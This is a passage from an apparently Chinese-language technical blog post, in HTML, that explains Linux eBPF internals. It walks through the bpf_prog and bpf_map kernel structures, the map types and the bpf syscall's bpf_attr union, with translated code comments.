class="hljs-title">bpf_attach_type</span><span class="hljs-title">expected_attach_type</span>;</span> <span class="hljs-comment">/* 用于一些程序类型 */</span><br>u32len;<span class="hljs-comment">/* filter 块的数量 */</span><br>u32jited_len;<span class="hljs-comment">/* 按字节计的被即时编译的指令大小 */</span><br>u8tag[BPF_TAG_SIZE];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_stats</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">stats</span>;</span><br><span class="hljs-type">int</span> __percpu*active;<br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span><span class="hljs-params">(*bpf_func)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *ctx,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_insn *insn)</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_aux</span>*<span class="hljs-title">aux</span>;</span><span class="hljs-comment">/* 辅助域 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog_kern</span>*<span class="hljs-title">orig_prog</span>;</span><span class="hljs-comment">/* 原始 BPF 程序 */</span><br><span class="hljs-comment">/* 翻译器的指令 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>DECLARE_FLEX_ARRAY(<span class="hljs-keyword">struct</span> sock_filter, insns);<br>DECLARE_FLEX_ARRAY(<span class="hljs-keyword">struct</span> bpf_insn, insnsi);<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其中 <code>bpf_func</code> 函数指针便指向 BPF 字节码经过 JIT 编译生成的汇编代码入口点</p><h2 id="五、eBPF-map"><a href="#五、eBPF-map" class="headerlink" title="五、eBPF map"></a>五、eBPF map</h2><p>bpf map 是一个通用的用以储存不同种类数据的结构，用以在用户进程与 eBPF 程序、eBPF 程序与 eBPF 程序之间进行<strong>数据共享</strong>，这些数据以二进制形式储存，因此用户在创建时只需要指定 key 与 value 的 size</p><p>bpf map 主要有以下五个基本属性：</p><ul><li><code>type</code>：map 的数据结构类型</li><li><code>key_size</code>：以字节为单位的用以索引一个元素的 key 的 size（在数组映射中使用）</li><li><code>value_size</code>：以字节为单位的每个元素的 size</li><li><code>max_entries</code>：map 中 entries 的最大数量</li><li><code>map_flags</code>：描述 map 的独特特征，例如是否整个 map 的内存应被预先分配等</li></ul><p>在内核当中使用一个 <code>bpf_map</code> 结构体表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> &#123;</span><br><span class="hljs-comment">/* 前两条缓存行带有以读取为主的成员，</span><br><span class="hljs-comment"> * 其中一些也在快速路径中被访问 (e.g. ops, max_entries).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops</span> ____<span class="hljs-title">cacheline_aligned</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> *<span class="hljs-title">inner_map_meta</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> <span class="hljs-title">map_type</span>;</span><br>u32 key_size;<br>u32 value_size;<br>u32 max_entries;<br>u64 map_extra; <span class="hljs-comment">/* any per-map-type extra fields */</span><br>u32 map_flags;<br>u32 id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_record</span> *<span class="hljs-title">record</span>;</span><br><span class="hljs-type">int</span> numa_node;<br>u32 btf_key_type_id;<br>u32 btf_value_type_id;<br>u32 btf_vmlinux_value_type_id;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf</span> *<span class="hljs-title">btf</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">obj_cgroup</span> *<span class="hljs-title">objcg</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">char</span> name[BPF_OBJ_NAME_LEN];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">btf_field_offs</span> *<span class="hljs-title">field_offs</span>;</span><br><span class="hljs-comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span><br><span class="hljs-comment"> * particularly with refcounting.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">atomic64_t</span> refcnt ____cacheline_aligned;<br><span class="hljs-type">atomic64_t</span> usercnt;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">freeze_mutex</span>;</span><br><span class="hljs-type">atomic64_t</span> writecnt;<br><span class="hljs-comment">/* &#x27;Ownership&#x27; of program-containing map is claimed by the first program</span><br><span class="hljs-comment"> * that is going to use this map or by the first program which FD is</span><br><span class="hljs-comment"> * stored in the map to make sure that all callers and callees have the</span><br><span class="hljs-comment"> * same prog type, JITed flag and xdp_has_frags flag.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">spinlock_t</span> lock;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span> <span class="hljs-title">type</span>;</span><br><span class="hljs-type">bool</span> jited;<br><span class="hljs-type">bool</span> xdp_has_frags;<br>&#125; owner;<br><span class="hljs-type">bool</span> bypass_spec_v1;<br><span class="hljs-type">bool</span> frozen; <span class="hljs-comment">/* write-once; write-protected by freeze_mutex */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="map-类型"><a href="#map-类型" class="headerlink" title="map 类型"></a>map 类型</h3><p>可选 map 类型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_map_type</span> &#123;</span><br>BPF_MAP_TYPE_UNSPEC,<br>BPF_MAP_TYPE_HASH,<br>BPF_MAP_TYPE_ARRAY,<br>BPF_MAP_TYPE_PROG_ARRAY,<br>BPF_MAP_TYPE_PERF_EVENT_ARRAY,<br>BPF_MAP_TYPE_PERCPU_HASH,<br>BPF_MAP_TYPE_PERCPU_ARRAY,<br>BPF_MAP_TYPE_STACK_TRACE,<br>BPF_MAP_TYPE_CGROUP_ARRAY,<br>BPF_MAP_TYPE_LRU_HASH,<br>BPF_MAP_TYPE_LRU_PERCPU_HASH,<br>BPF_MAP_TYPE_LPM_TRIE,<br>BPF_MAP_TYPE_ARRAY_OF_MAPS,<br>BPF_MAP_TYPE_HASH_OF_MAPS,<br>BPF_MAP_TYPE_DEVMAP,<br>BPF_MAP_TYPE_SOCKMAP,<br>BPF_MAP_TYPE_CPUMAP,<br>BPF_MAP_TYPE_XSKMAP,<br>BPF_MAP_TYPE_SOCKHASH,<br>BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br><span class="hljs-comment">/* BPF_MAP_TYPE_CGROUP_STORAGE is available to bpf programs attaching</span><br><span class="hljs-comment"> * to a cgroup. The newer BPF_MAP_TYPE_CGRP_STORAGE is available to</span><br><span class="hljs-comment"> * both cgroup-attached and other progs and supports all functionality</span><br><span class="hljs-comment"> * provided by BPF_MAP_TYPE_CGROUP_STORAGE. So mark</span><br><span class="hljs-comment"> * BPF_MAP_TYPE_CGROUP_STORAGE deprecated.</span><br><span class="hljs-comment"> */</span><br>BPF_MAP_TYPE_CGROUP_STORAGE = BPF_MAP_TYPE_CGROUP_STORAGE_DEPRECATED,<br>BPF_MAP_TYPE_REUSEPORT_SOCKARRAY,<br>BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE,<br>BPF_MAP_TYPE_QUEUE,<br>BPF_MAP_TYPE_STACK,<br>BPF_MAP_TYPE_SK_STORAGE,<br>BPF_MAP_TYPE_DEVMAP_HASH,<br>BPF_MAP_TYPE_STRUCT_OPS,<br>BPF_MAP_TYPE_RINGBUF,<br>BPF_MAP_TYPE_INODE_STORAGE,<br>BPF_MAP_TYPE_TASK_STORAGE,<br>BPF_MAP_TYPE_BLOOM_FILTER,<br>BPF_MAP_TYPE_USER_RINGBUF,<br>BPF_MAP_TYPE_CGRP_STORAGE,<br>&#125;;<br></code></pre></td></tr></table></figure><p>常用的主要是以下几种类型：</p><ul><li><code>BPF_MAP_TYPE_HASH</code>：以哈希表形式存储键值对，比较常规</li><li><code>BPF_MAP_TYPE_ARRAY</code>：以数组形式存储键值对，<strong>key 即为数组下标，对应的 value 皆初始化为 0</strong></li><li><code>BPF_MAP_TYPE_PROG_ARRAY</code>：特殊的数组映射，<strong>value 为其他 eBPF 程序的文件描述符</strong></li><li><code>BPF_MAP_TYPE_STACK</code>：以栈形式存储数据</li></ul><h3 id="map-wrapper"><a href="#map-wrapper" class="headerlink" title="map wrapper"></a>map wrapper</h3><h1 id="0x02-bpf-系统调用"><a href="#0x02-bpf-系统调用" class="headerlink" title="0x02.bpf 系统调用"></a>0x02.bpf 系统调用</h1><p>我们对 eBPF 所有的操作其实都是通过 <code>bpf</code> 系统调用来完成的，其原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size)</span>;<br></code></pre></td></tr></table></figure><h2 id="一、bpf-attr-结构体"><a href="#一、bpf-attr-结构体" class="headerlink" title="一、bpf_attr 结构体"></a>一、bpf_attr 结构体</h2><p>bpf 系统调用中的第二个参数是指向联合体 <code>bpf_attr</code> 的指针，定义于 <code>kernel/bpf/syscall.c</code> 中如下，对于不同的 <code>cmd</code>  而言其含义不同，因此这里是一个由多个结构体构成的联合体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_CREATE 命令所使用的匿名结构体 */</span><br>__u32map_type;<span class="hljs-comment">/* one of enum bpf_map_type */</span><br>__u32key_size;<span class="hljs-comment">/* key 按字节计的大小 */</span><br>__u32value_size;<span class="hljs-comment">/* value 按字节计的大小 */</span><br>__u32max_entries;<span class="hljs-comment">/* map 中最大的 entries 数量 */</span><br>__u32map_flags;<span class="hljs-comment">/* BPF_MAP_CREATE 相关的</span><br><span class="hljs-comment"> * 在上面定义的 flags.</span><br><span class="hljs-comment"> */</span><br>__u32inner_map_fd;<span class="hljs-comment">/* 指向内部 map 的 fd */</span><br>__u32numa_node;<span class="hljs-comment">/* numa node (仅当设置了</span><br><span class="hljs-comment"> * BPF_F_NUMA_NODE 时有效).</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span>map_name[BPF_OBJ_NAME_LEN];<br>__u32map_ifindex;<span class="hljs-comment">/* ifindex of netdev to create on */</span><br>__u32btf_fd;<span class="hljs-comment">/* 指向一个 BTF 类型数据的 fd */</span><br>__u32btf_key_type_id;<span class="hljs-comment">/* BTF type_id of the key */</span><br>__u32btf_value_type_id;<span class="hljs-comment">/* BTF type_id of the value */</span><br>__u32btf_vmlinux_value_type_id;<span class="hljs-comment">/* BTF type_id of a kernel-</span><br><span class="hljs-comment">   * struct stored as the</span><br><span class="hljs-comment">   * map value</span><br><span class="hljs-comment">   */</span><br><span class="hljs-comment">/* Any per-map-type extra fields</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * BPF_MAP_TYPE_BLOOM_FILTER - 最低 4 位指示了</span><br><span class="hljs-comment"> * 哈希函数的数量(若为 0, bloom filter 将默认</span><br><span class="hljs-comment"> * 使用 5 个哈希函数).</span><br><span class="hljs-comment"> */</span><br>__u64map_extra;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_*_ELEM 命令所使用的匿名结构体 */</span><br>__u32map_fd;<br>__aligned_u64key;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__aligned_u64 value;<br>__aligned_u64 next_key;<br>&#125;;<br>__u64flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_MAP_*_BATCH 命令所使用的匿名结构体 */</span><br>__aligned_u64in_batch;<span class="hljs-comment">/* start batch,</span><br><span class="hljs-comment"> * NULL to start from beginning</span><br><span class="hljs-comment"> */</span><br>__aligned_u64out_batch;<span class="hljs-comment">/* output: next start batch */</span><br>__aligned_u64keys;<br>__aligned_u64values;<br>__u32count;<span class="hljs-comment">/* input/output:</span><br><span class="hljs-comment"> * input: # of key/value</span><br><span class="hljs-comment"> * elements</span><br><span class="hljs-comment"> * output: # of filled elements</span><br><span class="hljs-comment"> */</span><br>__u32map_fd;<br>__u64elem_flags;<br>__u64flags;<br>&#125; batch;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_LOAD 命令所使用的匿名结构体 */</span><br>__u32prog_type;<span class="hljs-comment">/* one of enum bpf_prog_type */</span><br>__u32insn_cnt;<br>__aligned_u64insns;<br>__aligned_u64license;<br>__u32log_level;<span class="hljs-comment">/* verbosity level of verifier */</span><br>__u32log_size;<span class="hljs-comment">/* size of user buffer */</span><br>__aligned_u64log_buf;<span class="hljs-comment">/* user supplied buffer */</span><br>__u32kern_version;<span class="hljs-comment">/* not used */</span><br>__u32prog_flags;<br><span class="hljs-type">char</span>prog_name[BPF_OBJ_NAME_LEN];<br>__u32prog_ifindex;<span class="hljs-comment">/* ifindex of netdev to prep for */</span><br><span class="hljs-comment">/* For some prog types expected attach type must be known at</span><br><span class="hljs-comment"> * load time to verify attach type specific parts of prog</span><br><span class="hljs-comment"> * (context accesses, allowed helpers, etc).</span><br><span class="hljs-comment"> */</span><br>__u32expected_attach_type;<br>__u32prog_btf_fd;<span class="hljs-comment">/* fd pointing to BTF type data */</span><br>__u32func_info_rec_size;<span class="hljs-comment">/* userspace bpf_func_info size */</span><br>__aligned_u64func_info;<span class="hljs-comment">/* func info */</span><br>__u32func_info_cnt;<span class="hljs-comment">/* number of bpf_func_info records */</span><br>__u32line_info_rec_size;<span class="hljs-comment">/* userspace bpf_line_info size */</span><br>__aligned_u64line_info;<span class="hljs-comment">/* line info */</span><br>__u32line_info_cnt;<span class="hljs-comment">/* number of bpf_line_info records */</span><br>__u32attach_btf_id;<span class="hljs-comment">/* in-kernel BTF type id to attach to */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* valid prog_fd to attach to bpf prog */</span><br>__u32attach_prog_fd;<br><span class="hljs-comment">/* or valid module BTF object fd or 0 to attach to vmlinux */</span><br>__u32attach_btf_obj_fd;<br>&#125;;<br>__u32core_relo_cnt;<span class="hljs-comment">/* number of bpf_core_relo */</span><br>__aligned_u64fd_array;<span class="hljs-comment">/* array of FDs */</span><br>__aligned_u64core_relos;<br>__u32core_relo_rec_size; <span class="hljs-comment">/* sizeof(struct bpf_core_relo) */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_OBJ_* 命令所使用的匿名结构体 */</span><br>__aligned_u64pathname;<br>__u32bpf_fd;<br>__u32file_flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_ATTACH/DETACH 命令所使用的匿名结构体 */</span><br>__u32target_fd;<span class="hljs-comment">/* container object to attach to */</span><br>__u32attach_bpf_fd;<span class="hljs-comment">/* eBPF program to attach */</span><br>__u32attach_type;<br>__u32attach_flags;<br>__u32replace_bpf_fd;<span class="hljs-comment">/* previously attached eBPF</span><br><span class="hljs-comment"> * program to replace if</span><br><span class="hljs-comment"> * BPF_F_REPLACE is used</span><br><span class="hljs-comment"> */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_TEST_RUN 命令所使用的匿名结构体 */</span><br>__u32prog_fd;<br>__u32retval;<br>__u32data_size_in;<span class="hljs-comment">/* input: len of data_in */</span><br>__u32data_size_out;<span class="hljs-comment">/* input/output: len of data_out</span><br><span class="hljs-comment"> *   returns ENOSPC if data_out</span><br><span class="hljs-comment"> *   is too small.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64data_in;<br>__aligned_u64data_out;<br>__u32repeat;<br>__u32duration;<br>__u32ctx_size_in;<span class="hljs-comment">/* input: len of ctx_in */</span><br>__u32ctx_size_out;<span class="hljs-comment">/* input/output: len of ctx_out</span><br><span class="hljs-comment"> *   returns ENOSPC if ctx_out</span><br><span class="hljs-comment"> *   is too small.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64ctx_in;<br>__aligned_u64ctx_out;<br>__u32flags;<br>__u32cpu;<br>__u32batch_size;<br>&#125; test;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_*_GET_*_ID 命令所使用的匿名结构体 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32start_id;<br>__u32prog_id;<br>__u32map_id;<br>__u32btf_id;<br>__u32link_id;<br>&#125;;<br>__u32next_id;<br>__u32open_flags;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_OBJ_GET_INFO_BY_FD 命令所使用的匿名结构体 */</span><br>__u32bpf_fd;<br>__u32info_len;<br>__aligned_u64info;<br>&#125; info;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* BPF_PROG_QUERY 命令所使用的匿名结构体 */</span><br>__u32target_fd;<span class="hljs-comment">/* container object to query */</span><br>__u32attach_type;<br>__u32query_flags;<br>__u32attach_flags;<br>__aligned_u64prog_ids;<br>__u32prog_cnt;<br><span class="hljs-comment">/* output: per-program attach_flags.</span><br><span class="hljs-comment"> * not allowed to be set during effective query.</span><br><span class="hljs-comment"> */</span><br>__aligned_u64prog_attach_flags;<br>&#125; query;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* anonymous struct used by BPF_RAW_TRACEPOINT_OPEN command */</span><br>__u64 name;<br>__u32 prog_fd;<br>&#125; raw_tracepoint;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* anonymous struct for BPF_BTF_LOAD */</span><br>__aligned_u64btf;<br>__aligned_u64btf_log_buf;<br>__u32btf_size;<br>__u32btf_log_size;<br>__u32btf_log_level;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32pid;<span class="hljs-comment">/* input: pid */</span><br>__u32fd;<span class="hljs-comment">/* input: fd */</span><br>__u32flags;<span class="hljs-comment">/* input: flags */</span><br>__u32buf_len;<span class="hljs-comment">/* input/output: buf len */</span><br>__aligned_u64buf;<span class="hljs-comment">/* input/output:</span><br><span class="hljs-comment"> *   tp_name for tracepoint</span><br><span class="hljs-comment"> *   symbol for kprobe</span><br><span class="hljs-comment"> *   filename for uprobe</span><br><span class="hljs-comment"> */</span><br>__u32prog_id;<span class="hljs-comment">/* output: prod_id */</span><br>__u32fd_type;<span class="hljs-comment">/* output: BPF_FD_TYPE_* */</span><br>__u64probe_offset;<span class="hljs-comment">/* output: probe_offset */</span><br>__u64probe_addr;<span class="hljs-comment">/* output: probe_addr */</span><br>&#125; task_fd_query;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <span class="hljs-comment">/* struct used by BPF_LINK_CREATE command */</span><br>__u32prog_fd;<span class="hljs-comment">/* eBPF program to attach */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32target_fd;<span class="hljs-comment">/* object to attach to */</span><br>__u32target_ifindex; <span class="hljs-comment">/* target ifindex */</span><br>&#125;;<br>__u32attach_type;<span class="hljs-comment">/* attach type */</span><br>__u32flags;<span class="hljs-comment">/* extra flags */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u32target_btf_id;<span class="hljs-comment">/* btf_id of target to attach to */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__aligned_u64iter_info;<span class="hljs-comment">/* extra bpf_iter_link_info */</span><br>__u32iter_info_len;<span class="hljs-comment">/* iter_info length */</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-comment">/* black box user-provided value passed through</span><br><span class="hljs-comment"> * to BPF program at the execution time and</span><br><span class="hljs-comment"> * accessible through bpf_get_attach_cookie() BPF helper</span><br><span class="hljs-comment"> */</span><br>__u64bpf_cookie;<br>&#125; perf_event;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32flags;<br>__u32cnt;<br>__aligned_u64syms;<br>__aligned_u64addrs;<br>__aligned_u64cookies;<br>&#125; kprobe_multi;<br><span class="hljs-class"><span 